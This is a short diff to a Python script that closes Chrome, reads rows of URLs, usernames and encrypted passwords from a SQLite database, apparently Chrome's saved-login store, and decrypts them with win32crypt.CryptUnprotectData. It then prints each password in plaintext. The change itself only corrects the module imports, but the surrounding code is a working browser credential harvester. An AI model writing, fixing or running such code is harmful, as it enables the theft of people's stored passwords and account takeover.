@@ -1,8 +1,8 @@
 import os
 import sqlite3
 from time import sleep
-import pywin
-import wincrypt
+import pywin32
+import win32crypt
 
 #defining a function
 def closeChrome():
@@ -17,7 +17,7 @@ def connectDb():
     data=cursorObj.fetchall()
     print(data)
     for url,username,password in data:
-        password=wincrypt.CryptUnprotectData(password)
+        password=win32crypt.CryptUnprotectData(password)
         print(f'url: {url} username: {username} password :{password[1].decode("utf-8")}')
         print(".............................................")
 
